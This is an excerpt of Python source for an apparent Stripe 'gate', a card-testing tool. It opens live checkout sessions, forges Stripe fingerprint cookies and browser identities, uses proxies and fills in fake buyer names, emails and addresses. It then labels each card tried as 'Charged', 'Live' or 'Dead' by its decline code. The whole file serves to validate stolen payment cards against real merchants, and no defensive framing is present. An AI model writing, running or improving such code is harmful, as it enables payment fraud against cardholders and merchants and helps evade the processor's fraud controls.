...
import sys
import os
from urllib.parse import unquote, quote as url_quote, urlparse
...
# ── Stripe fingerprint (m.stripe.com/6) ──
...
# ── Session Initializer (call once per checkout URL, reuse for all cards) ──
async def stripe_init_session(
    cs_live: str,
    pk_live: str,
    proxy: str = None,
    debug: bool = False,
    ...
    """
    Initialize a Stripe checkout session ONCE.
    Calls fingerprint + /init + /update, returns a reusable context dict.
    Pass the returned dict as init_ctx to stripe_gate() for each card.
    """
    ...
    try:
        async with AsyncSession(
            ...
            if "error" in j1:
                ...
                ctx["error"] = f"[ Payment Failed ] » [{ec} » {em}]"
                return ctx

            ctx["init_checksum"] = j1.get("init_checksum", "")
            ...
            try:
                _parsed = urlparse(surl)
                if _parsed.hostname:
                    site = _parsed.hostname.removeprefix("www.")
            except Exception:
                pass

            ctx["merchant"] = coname
            ctx["product"] = items
            ctx["price"] = f"{currency.upper()} {amttt}"
            ctx["amount"] = amount
            ...
            _needs_email = not _customer_email
            ...
            ctx["needs_phone"] = _needs_phone
            ctx["needs_billing_addr"] = _needs_billing_addr
            ctx["needs_shipping"] = _needs_shipping
            ctx["needs_tos"] = _needs_tos
            ctx["needs_email"] = _needs_email
            ...
            if debug:
                _logger.debug(
                    ...
                    email=_needs_email,
                    phone=_needs_phone,
                    billing=f"{_needs_billing_addr} ({_billing_cfg})",
                    shipping=_needs_shipping,
                    tos=_needs_tos,
                )
            ...
            if _any_details_needed:
                ...
                if _needs_billing_addr:
                    update_data["name"] = f"{fname} {lname}"
                    update_data["address[country]"] = "US"
                    update_data["address[line1]"] = addr["street"]
                    update_data["address[line2]"] = ""
                    update_data["address[city]"] = addr["city"]
                    update_data["address[state]"] = addr["state"]
                    update_data["address[postal_code]"] = addr["zip"]
                if _needs_shipping:
                    ...
                    update_data["shipping_address[address][line2]"] = ""
                ...
                _update_url = f"https://api.stripe.com/v1/payment_pages/{cs_live}"
                try:
                    ...
                    ctx["update_ok"] = r_upd.status_code in (200, 201)
                except Exception:
                    ctx["update_ok"] = False
...
async def stripe_gate(
    ...
    If init_ctx is provided (from stripe_init_session), skips /init + fingerprint.
    """
    # ── Use pre-fetched context or generate fresh ──
    if init_ctx:
        ua = init_ctx["ua"]
        impersonate = init_ctx["impersonate"]
        version = init_ctx["version"]
        fingerprint = init_ctx["fingerprint"]
        init_checksum = init_ctx["init_checksum"]
        coname = init_ctx["merchant"]
        items = init_ctx["product"]
        amount = init_ctx["amount"]
        amttt = int(amount) / 100
        currency = init_ctx["currency"]
        surl = init_ctx["surl"]
        site = init_ctx["site"]
        email = init_ctx["email"]
        fname = init_ctx["fname"]
        lname = init_ctx["lname"]
        phone = init_ctx["phone"]
        addr = init_ctx["addr"]
        _needs_phone = init_ctx["needs_phone"]
        _needs_billing_addr = init_ctx["needs_billing_addr"]
        _needs_shipping = init_ctx["needs_shipping"]
        _needs_tos = init_ctx["needs_tos"]
        _needs_email = init_ctx["needs_email"]
        _session_mode = init_ctx["session_mode"]
        _update_ok = init_ctx["update_ok"]
    else:
        fname = random.choice(FIRST_NAMES)
        lname = random.choice(LAST_NAMES)
        email = _random_email()
    ...
    extra = lambda **kw: {"merchant": coname, "price": f"{currency.upper()} {amttt}", "product": items, "receipt": surl, "email": email, "site": site, **kw}
    max_retries = 1
    ...
    async with AsyncSession(
        ...
        # ── Fingerprint + Init: skip if init_ctx provided ──
        if init_ctx and fingerprint:
            client.cookies.set("__stripe_mid", fingerprint["muid"], domain=".stripe.com")
            client.cookies.set("__stripe_sid", fingerprint["sid"], domain=".stripe.com")
        else:
            fingerprint = await _get_stripe_fingerprint(client, ua, cs_live)
            ...
            # ── Step 1: Init Checkout Session (only when no init_ctx) ──
            r1 = None
            _init_err = None
        ...
        for attempt in range(max_retries + 1):
            ...
            if j2 and j2.get("id"):
                direct_pm = j2["id"]
                if debug:
                    _logger.debug(f"PM created", pm=direct_pm[:20] + "...")
                break
            else:
                ...
                if "integration surface" in err_msg.lower() or "tokenization" in err_msg.lower():
                    return "Dead", "Merchant blocks raw card tokenization", extra(decline_code="surface_blocked", stripe_msg=err_msg)

                if err_msg:
                    clean_msg, stype = _classify_decline(dcode, code, err_msg)
                    dc_label = dcode or code or ""
                    if stype == "live":
                        return "Live", clean_msg, extra(decline_code=dc_label, stripe_msg=err_msg)
        ...
        if debug:
            _logger.debug(f"Confirm payload", pm=newpm[:20] + "...", amount=str(amount), checksum=bool(init_checksum), tos=_needs_tos)
        ...
        try:
            ...
            if debug:
                _logger.debug(f"Confirm exception", error=str(_conf_exc)[:200])
            return "Dead", "Confirm request failed", extra()

        if debug:
            _logger.debug(f"Confirm response", status=r3.status_code, body=r3_text[:400])

        surl = j3.get("success_url", surl)
        status3 = j3.get("status")

        if status3 == "succeeded":
            return "Charged", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")
        if "You passed" in r3_text:
            ...
            dc_label = dcode or code or ""
            if stype == "live":
                return "Live", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)
            elif stype == "3ds":
